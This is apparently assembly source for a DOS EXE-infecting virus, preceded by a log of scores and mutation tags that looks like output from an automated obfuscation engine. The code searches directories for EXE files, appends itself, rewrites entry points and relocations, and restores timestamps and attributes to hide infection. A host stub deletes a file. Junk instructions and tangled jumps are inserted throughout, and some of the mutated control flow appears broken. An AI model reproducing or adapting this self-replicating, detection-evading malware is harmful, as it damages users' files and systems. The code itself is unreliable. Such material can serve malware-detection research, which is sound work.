;1.10933011284
;UntouchBlock_0
;1.03240330161
;1.2963931439
;		JZ 	_1
;1.07641726968
;1.307359618
;0.924470356576
;1.01890555851
;1.04020035063
;		JNZ 	_0
;1.17373489358
;		JNZ 	_1
;0.984345641308
;		JNZ 	_1
;0.807970041585
;1.02602297214
;1.09568080144
;NoMutation
;1.03688870374
;0.499653293799
;0.786927429335
;1.05558376582
;1.11222602028
;0.878314646948
;0.680371412431
;1.0971475831
;0.88848032869
;1.09137215228
;1.04055926124
;0.969317233822
;0.98241564498
;		JNZ 	_0
;1.0821698253
;0.980837432239
;UntouchBlock_0
;1.08065585259
;UntouchBlock_0
;0.92922490952
;0.839581957961
;0.905697180086
;		JZ 	_1
;0.950227609874
;ForcedJMP_1
;0.881464677661
;0.753484114449
;0.830510251468
;0.891047165309
;0.625281447417
;UntouchBlock_0
;0.504610019563
;1.04298260067
;0.744334254669
;0.8548015397
;0.752300796408
;ForcedJMP_0
;0.605789788741
;1.05899889394
;0.948846214481
;1.03159667492
;1.05143260835
;1.2431583827
;NoMutation
;0.969667269286
;0.951541911382
;ForcedJMP_0
;1.22234279896
;ForcedJMP_1
;1.52185635126
;		JNZ 	_0
;0.863371809984
;1.4611601181
;1.10400869954
;0.848995449786
;		JNZ 	_0
;0.868800301572
;ForcedJMP_0
;1.18277032583
;0.92909922184
;1.01880116127
;		JNZ 	_0
;1.00713114272
;UntouchBlock_0
;0.918917233836
;0.899704798416
;0.691306307824
;0.825334361277
;0.75948845165
;0.676006669578
;0.846390749025
;ForcedJMP_0
;0.908738064061
;NoMutation
;0.772035916681
;		JZ 	_0
;0.983778813734
;0.820428867488
;0.866353567056
;1.30029397623
;0.85518407347
;1.1439677886
;		JZ 	_0
;0.974875605153
;0.963396132836
;0.859068360292
;1.05638193755
;1.31047389891
;0.964834384936
;0.967177890024
;0.923940160366
;0.974849029215
;0.66848486732
;0.45440667177
;0.347228107435
;1.01627290279
;		JNZ 	_1
;0.843648679323
;UntouchBlock_0
;0.832472623049
;NoMutation
;1.00553543683
;NoMutation
;0.997682329164
;UntouchBlock_1
;1.4211990246
;0.5991896422
;		JNZ 	_1
;0.759850426499
;0.774936159286
;UntouchBlock_1
;0.98512681907
;		JZ 	_0
;0.806584213892
;0.735623174501
;1.07038271124
;		JNZ 	_0
;0.667357828197
;		JNZ 	_1
;0.751873105334
;		JZ 	_0
;1.05580504449
;ForcedJMP_1
;0.658608123134
;NoMutation
;0.771613245147
;1.14563582963
;UntouchBlock_0
;1.04834763841
;ForcedJMP_1
;0.87901405227
;0.662890848057
;0.709375228352
;0.621321570818
;0.889805153707
;		JNZ 	_1
;1.12188825455
;		JNZ 	_0
;0.741063965404
;0.977720691946
;UntouchBlock_0
;1.02823075169
;0.790375878163
;		JNZ 	_1
;0.747398049352
;UntouchBlock_1
;0.885210573834
;0.722655717586
;0.910259785668
;0.588868345065
;0.915676504451
;NoMutation
;0.719835557859
;		JNZ 	_0
;0.880466066102
;0.390224646037
;0.737017818921
;0.582712039345
;UntouchBlock_1
;0.729260562657
;NoMutation
;0.812485494162
;UntouchBlock_0
;0.722622882795
;0.419954514714
;NoMutation
;0.880881889902
;		JZ 	_0
;0.681569375502
;0.859506497974
;		JNZ 	_0
;0.901632354819
;0.621754016407
;0.596289813825
;UntouchBlock_1
;0.789646686603
;0.641298035711
;UntouchBlock_1
;0.748042535186
;UntouchBlock_0
;0.605072731493
;		JZ 	_1
;0.691296391044
;0.820917440267
;0.873245396846
;ForcedJMP_0
;1.09738617965
;0.66479054492
;0.993027222548
;		JNZ 	_0
;1.01428722054
;		JZ 	_0
;0.695468248182
;0.581543378793
;0.560964857875
;0.688343696154
;		JNZ 	_1
;0.702177308211
;0.552389060855
;0.408265721142
;UntouchBlock_0
;0.575845265787
;0.793212892645
;0.629378939098
;0.844818523335
;1.0218581525
;		JNZ 	_0
;0.554798426363
;0.637109331855
;0.550189043427
;0.706143256989
;ForcedJMP_1
;0.893179230904
;ForcedJMP_1
;0.564962938034
;0.72276598936
;NoMutation
;0.5791935004
;UntouchBlock_0
;0.518115990485
;0.469389929209
;0.513500160944
;NoMutation
;0.490173636371
;0.632866382417
;0.474429042472
;0.636974292007
;0.415566824206
;UntouchBlock_0
;0.494522303509
;		JZ 	_0
;0.491221298517
;0.478291076518
;UntouchBlock_1
;0.424348935847
;		JZ 	_1
;0.425917635836
;		JZ 	_0
;0.363936253689
;ForcedJMP_1
;0.300908742932
;0.575094697457
;		JZ 	_0
;0.352002058421
;0.412098941969
;0.587870659767
;		JZ 	_0
;0.510726735665
;		JNZ 	_0
;0.328654002785
;0.400385663749
;NoMutation
;0.357963875395
;0.426198686457
;0.475706062617
;0.350001355261
;ForcedJMP_0
;0.428957414791
;0.344417942302
;0.313474127158
;0.323301951311
;0.300953610302
;0.38978812232
;0.28939517783
;0.47041580758
;UntouchBlock_1
;0.351190827736
;0.33215601076
;0.318308204418
;0.342434849431
;0.342345774017
;0.17560659313
;0.183700945366
;		JNZ 	_1
;0.370618080355
;0.397911478223
;0.245159752624
;0.263425177677
;UntouchBlock_0
;0.170080918288
;0.170498058478
;0.131452803403
;0.17742525367
;0.239960250689
;		JZ 	_0
;0.189219403117
;0.172394335951
;0.149310132175
;ForcedJMP_1
;0.140677978074
;0.150632681914
;		JZ 	_0
;0.117873091039
;ForcedJMP_0
;0.0926816324977
;0.077726247626
;UntouchBlock_1
;		JNZ 	_0
;ForcedJMP_1
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
	 mov ax,cs 
		JMP 	JHMFG
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
JHMFG:
	 mov ds,ax
UPAHE:
ZSGDH:
	 mov dx,OFFSET PGMSTR
	 mov ah,41H
LLNXX:
B_LBO:
	 int 21H 
	 mov ah,4CH
		JMP 	_LKPA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
_LKPA:
	 mov al,0
WS_KM:
EKD__:
OIBVY:
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 


VIRUS:
		 push ax
		 mov ax,cs
		 mov ds,ax 						
		 mov ax,es 						
		 mov WORD PTR [OLDDTA+2],ax 	
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			
EFFBL:
		call 	 GGNYB
FDAXW:
		call 	 XGMRP
YLGSM:
		call 	 KWNIH


FINISH:  call RESTORE_DTA 	
WVVHX:
		call 	 RANIS
 		 pop ax

REL1: 						
		JMP 	ZQYGA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
ZQYGA:
 		 mov ax,HSTACK 				
		JMP 	YLGSM
KWNIH:
 		 cli 
 		 mov ss,ax
		cmp 	ax,dx
JZ XGMRP
JMP FDAXW
XGMRP:
JZ GGNYB
JMP EFFBL
GGNYB:

REL1A: 						
 		 mov sp,OFFSET HSTACK
JNZ LRCOS
JMP IOLMG
LRCOS:
 		 mov es,WORD PTR [OLDDTA+2] 
JZ RANIS
JMP WVVHX
RANIS:
		 mov ds,WORD PTR [OLDDTA+2] 
		cmp 	cx,ax
JNZ GPZEC
JMP PXLZP
GPZEC:
NEWMZ:
		call 	 RYBOJ
 		 sti 					

REL2:					 			
IOLMG:
		call 	 LRCOS
 		jmp FAR PTR HOST 
OBDSP:
PXLZP:
		call 	 GPZEC
		call 	 OGIOH


FIND_FILE:
	mov al,’\’ 
		JMP 	ZJPSW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZJPSW:
		JMP 	IDBBT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
IDBBT:
	mov BYTE PTR [USEFILE],al
		cmp 	bx,dx
JNZ OGIOH
JMP OBDSP
OGIOH:
JNZ RRMVS
JMP CHVLY
RRMVS:
JNZ RYBOJ
JMP NEWMZ
RYBOJ:
	mov si,OFFSET USEFILE+1
		cmp 	bx,cx
JZ VZQYW
JMP KXHXN
VZQYW:
	xor dl,dl
	mov ah,47H
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
CHVLY:
		call 	 RRMVS
	mov BYTE PTR [USEFILE],al 
		cmp 	dx,cx
JNZ VI_LP
JMP QGDWO
KXHXN:
		call 	 VZQYW
HRSKS:
		call 	 XISLI
VI_LP:

FF2: mov al,2
		cmp 	dx,cx
JZ XISLI
JMP HRSKS
XISLI:
	mov [LEVEL],al 
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
	mov BYTE PTR [USEFILE],al 
	inc al 
	mov [LEVEL],al 
J__UI:
		call 	 MCWTV
QGDWO:
		call 	 VI_LP
	call FINDBR 

FF3:
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
		JMP 	GHDEJ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
GHDEJ:
	mov di,OFFSET USEFILE 
		cmp 	ax,cx
JNZ MCWTV
JMP J__UI
MCWTV:
		cmp 	cx,ax
JNZ BBHQN
JMP DMDCV
BBHQN:
	mov si,OFFSET ALLFILE 
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
DMDCV:
		call 	 BBHQN
OELPR:
		call 	 F_PHM
ZANFO:
		call 	 NSY_L
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		mov di,OFFSET USEFILE
		cmp 	bx,ax
JZ NSY_L
JMP ZANFO
NSY_L:
		mov bx,OFFSET DTA2+1EH
		mov al,[LEVEL]
		mov dl,2BH 
		JMP 	OELPR
F_PHM:
		mul dl 
		add bx,ax 
		JMP 	QSYK_
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
QSYK_:
		mov si,bx
		JMP 	IMQYB
SAVR_:
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
IMQYB:
		call 	 SAVR_
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
WFAPT:
		call 	 GNGQJ
		stosb

		JMP 	BXVZC
xor bx,cx
xor bx,cx
BXVZC:
FBE1: mov al,1 
	or al,al
	ret

FBE2: pop di 

FBE3: xor al,al 
XSGFB:
		call 	 GGKTA
 	  ret 


FINDEXE:
		mov dx,OFFSET DTA1 
		mov ah,1AH
		JMP 	WFAPT
GNGQJ:
		int 21H
		mov di,OFFSET USEFILE
		JMP 	ONKBS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
ONKBS:
		mov si,OFFSET EXEFILE
		call CONCAT 
		push di 
		mov dx,OFFSET USEFILE
		cmp 	ax,cx
JZ GGKTA
JMP XSGFB
GGKTA:
		mov cx,3FH 
		JMP 	IQQQG
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
IQQQG:
		mov ah,4EH
JNZ BLPJZ
JMP _VB_E
BLPJZ:
JZ QIWCI
JMP AYRLE
QIWCI:
ZMQZG:
		call 	 QLEAS
AYRLE:
		call 	 QIWCI
_VB_E:
		call 	 BLPJZ
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		JMP 	NRCUG
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
NRCUG:
		mov di,OFFSET USEFILE
		cmp 	ax,ax
JNZ QLEAS
JMP ZMQZG
QLEAS:
JNZ KHNJI
JMP NSKBU
KHNJI:
		mov si,OFFSET DTA1+1EH
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		mov ah,4FH
		int 21H 
NSKBU:
		call 	 KHNJI
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
 	 mov BYTE PTR [di],0 
	 stc
	 ret

FENC:
	 pop di
	 ret


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
	 int 21H
	 mov dx,OFFSET USEFILE
		JMP 	EQYXY
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
EQYXY:
	 mov cx,10H 
	 mov ah,4EH 
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
		JMP 	JFTBF
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
JFTBF:
	 mov ah,1AH 
		cmp 	ax,ax
JZ DTZDS
JMP JFZMG
DTZDS:
	 int 21H
	 mov ah,4FH
		JMP 	CEJXQ
BNZPX:
	 int 21H 
Y_NZH:
		call 	 QXQUV
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
JFZMG:
		call 	 DTZDS
 	 xor al,al 

NEXTD3:
CEJXQ:
		call 	 BNZPX
WFWXU:
		call 	 XGNLS
	 ret 


GET_DTA:
 mov dx,OFFSET DTA2
		cmp 	cx,cx
JZ XGNLS
JMP WFWXU
XGNLS:
		JMP 	FWWXK
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FWWXK:
 mov al,2BH
		cmp 	ax,cx
JZ ANOFP
JMP LVMMS
ANOFP:
 mul [LEVEL]
 add dx,ax 
 ret
SNQZH:
		call 	 RAMLJ


CONCAT:
	 mov al,byte ptr es:[di] 
		JMP 	TCPYT
MXMJC:
JZ QXQUV
JMP Y_NZH
QXQUV:
		cmp 	dx,bx
JZ RAMLJ
JMP SNQZH
RAMLJ:
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
LVMMS:
		call 	 ANOFP
TCPYT:
		call 	 MXMJC
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
	 ret 	 


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
ZNNNP:
		call 	 CMTBV
	 call IS_ID_THERE 

OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
		JMP 	ZNNNP
CMTBV:
		 mov ah,’Z’
JNZ EGDKN
JMP URIGK
EGDKN:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
	     ret 
URIGK:
		call 	 EGDKN


GET_EXE_HEADER:
	 mov dx,OFFSET USEFILE
JNZ VQYAR
JMP CDVFS
VQYAR:
	 mov ax,3D02H 
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR 
	 mov ah,3FH
CDVFS:
		call 	 VQYAR
	 int 21H

RE_RET: ret 


REL_ROOM:
	 mov ax,WORD PTR [EXE_HDR+8] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
	 cmp ax,4*NUMRELS 

RR_RET: ret     
ROB_D:
		call 	 PLIIS


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
	 mul dx
	 mov cx,dx
	 mov dx,ax 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ah,3FH
		cmp 	cx,cx
JZ CVDEO
JMP KLJM_
CVDEO:
	 mov bx,[HANDLE]
	 mov dx,OFFSET VIDC
	 mov cx,2 
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
	 mov ax,[VIDC]
		JMP 	ROB_D
PLIIS:
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
	 stc 

II_RET: ret
KLJM_:
		call 	 CVDEO


SETBDY:
		JMP 	BVOJS
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
BVOJS:
	 mov al,BYTE PTR [FSIZE]
		cmp 	bx,cx
JZ KO_GB
JMP XHRPB
KO_GB:
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
	 sub cl,al 
	 mov dx,OFFSET FINAL
		cmp 	ax,ax
JZ DJJY_
JMP CVWYX
DJJY_:
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H

XHRPB:
		call 	 KO_GB
CVWYX:
		call 	 DJJY_
SB_E: ret


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
	 mov dx,WORD PTR [FSIZE]
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
	 xor dx,dx 
	 mov bx,[HANDLE] 
		JMP 	TLQIG
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
TLQIG:
		JMP 	PBYYY
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
PBYYY:
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
	 mov cx,WORD PTR [FSIZE+2]
MTNSE:
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
		JMP 	JJZBI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
JJZBI:
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1A 
	 inc bx 
	 add dx,bx
	 mov bx,0
EZEPM:
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+16 
		JMP 	_AZ__
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
_AZ__:
	 mov bx,[HANDLE] 
FEVPO:
	 mov cx,2
	 mov ah,40H 
KFXWU:
VSBTL:
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL2 
	 add bx,1 
	 add dx,bx
	 mov bx,0
UONGX:
	 adc cx,bx 
	 mov bx,[HANDLE]
LOHGJ:
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
	 mov bx,[HANDLE]
	 mov cx,4
	 mov ah,40H 
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
	 mov cl,4 
	 shr ax,cl 
	 mov bx,WORD PTR [FSIZE+2]
	 and bl,0FH
	 mov cl,4
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
	 add bx,10H 
	 mov cl,4 
	 shr bx,cl
	 add ax,bx
		JMP 	CDVLD
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
CDVLD:
	 mov WORD PTR [EXE_HDR+14],ax 
		JMP 	UGCEI
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
UGCEI:
	 mov ax,OFFSET VIRUS 
	 mov WORD PTR [EXE_HDR+20],ax 
	 mov ax,STACKSIZE 
FCBEB:
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
RD_JG:
	 mov dx,WORD PTR [FSIZE+2]
	 mov ax,WORD PTR [FSIZE] 
	 mov bx,OFFSET FINAL
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
	 mov cl,9
	 shr ax,cl
	 mov cl,7
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,NUMRELS 
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
		JMP 	WREGG
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
WREGG:
	 mov ax,WORD PTR [EXE_HDR+6] 
KAJRD:
	 dec ax 
	 dec ax 
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
	 mov dx,ax
LOKVK:
		cmp 	cx,dx
JNZ MHJXU
JMP Y_DOR
MHJXU:
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL1 
PCDA_:
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL2
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
	 mov WORD PTR [EXE_HDR+6],ax
		cmp 	bx,cx
JZ OAJWE
JMP CS_C_
OAJWE:
	 mov cx,8 
		cmp 	cx,cx
JZ BCXDN
JMP AGCAG
BCXDN:
	 mov dx,OFFSET EXE_HDR
		cmp 	cx,bx
JZ XZRXD
JMP ZRMAS
XZRXD:
JZ FMSON
JMP ZNAIV
FMSON:
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 ret 
Y_DOR:
CS_C_:
		call 	 OAJWE
		call 	 MHJXU
AGCAG:
		call 	 BCXDN
LC_QU:
		call 	 TEVJV



ZRMAS:
		call 	 XZRXD
TIMECT EQU 63 


SHOULDRUN:
ZNAIV:
		call 	 FMSON
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
 	 ret ;



SETSR:
	 mov al,90H 
		cmp 	ax,ax
JNZ TEVJV
JMP LC_QU
TEVJV:
	 mov BYTE PTR SR1,al 
	 ret


NEW_DTA:
	 mov ah,2FH 
	 int 21H
	 mov WORD PTR [OLDDTA],bx
		JMP 	ERTGU
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
ERTGU:
	 mov ax,es
		cmp 	bx,cx
JZ X_RHU
JMP WMCYW
X_RHU:
		JMP 	NIWRA
TLPVU:
	 mov WORD PTR [OLDDTA+2],ax
	 mov ax,cs
	 mov es,ax 
	 mov dx,OFFSET DTA1 
	 mov ah,1AH
	 int 21H 
YVXKX:
		call 	 DARHM
NIWRA:
		call 	 TLPVU
WMCYW:
		call 	 X_RHU
	 ret

RESTORE_DTA:
	 mov dx,WORD PTR [OLDDTA] 
		JMP 	YVXKX
DARHM:
	 mov ax,WORD PTR [OLDDTA+2]
	 mov ds,ax
	 mov ah,1AH
	 int 21H 
	 mov ax,cs 
	 mov ds,ax
LWUME:
		call 	 DUMIE
O_NCN:
		call 	 NGUII
BLBPT:
		call 	 HLGY_
YITHR:
		call 	 HAGJW
WM_XG:
		call 	 GUOSD
	 ret	 

SAVE_ATTRIBUTE:
	 mov ah,43H 
		JMP 	LWUME
DUMIE:
	 mov al,0
	 mov dx,OFFSET USEFILE
		cmp 	bx,bx
JZ GUOSD
JMP WM_XG
GUOSD:
	 int 21H
	 mov [FATTR],cl 
		cmp 	cx,ax
JZ HAGJW
JMP YITHR
HAGJW:
	 mov ah,43H
	 mov al,1
	 mov dx,OFFSET USEFILE
	 mov cl,0
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov al,2 
	 mov ah,3DH 
		JMP 	O_NCN
NGUII:
	 int 21H
		JMP 	VBWDG
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
VBWDG:
	 mov [HANDLE],ax 
		JMP 	BLBPT
HLGY_:
JZ EVGIK
JMP EJ_UR
EVGIK:
	 mov ah,57H 
		JMP 	LQPFM
BIX_E:
	 xor al,al
	 mov bx,[HANDLE]
	 int 21H
	 mov [FTIME],cx 
	 mov [FDATE],dx 
		cmp 	bx,cx
JZ __RIN
JMP UEXXS
__RIN:
	 mov ax,WORD PTR [DTA1+28] 
		JMP 	YODOM
xor bx,cx
YODOM:
	 mov WORD PTR [FSIZE+2],ax 
	 mov ax,WORD PTR [DTA1+26] 
	 mov WORD PTR [FSIZE],ax
GAXIH:
		call 	 WATYI
DLBGS:
		call 	 VDUQE
CVEIY:
		call 	 PZUUY
 	 ret

EJ_UR:
LQPFM:
		call 	 BIX_E
UEXXS:
		call 	 __RIN
XCBPA:
		call 	 PYQCA
		call 	 EVGIK


REST_ATTRIBUTE:
	 mov dx,[FDATE] 
	 mov cx,[FTIME]
	 mov ah,57H 
	 mov al,1
	 mov bx,[HANDLE]
		JMP 	GAXIH
WATYI:
	 int 21H
	 mov ah,3EH
		cmp 	bx,ax
JNZ PZUUY
JMP CVEIY
PZUUY:
	 mov bx,[HANDLE]
	 int 21H
	 mov cl,[FATTR]
	 xor ch,ch
	 mov ah,43H 
	 mov al,1
		cmp 	ax,bx
JZ PYQCA
JMP XCBPA
PYQCA:
JNZ VDUQE
JMP DLBGS
VDUQE:
	 mov dx,OFFSET USEFILE
		JMP 	OPHUL
TTUTW:
		JMP 	SPOOV
WYAAS:
	 int 21H
SPOOV:
		call 	 WYAAS
OPHUL:
		call 	 TTUTW
	 ret

FINAL: 

VSEG ENDS 	 

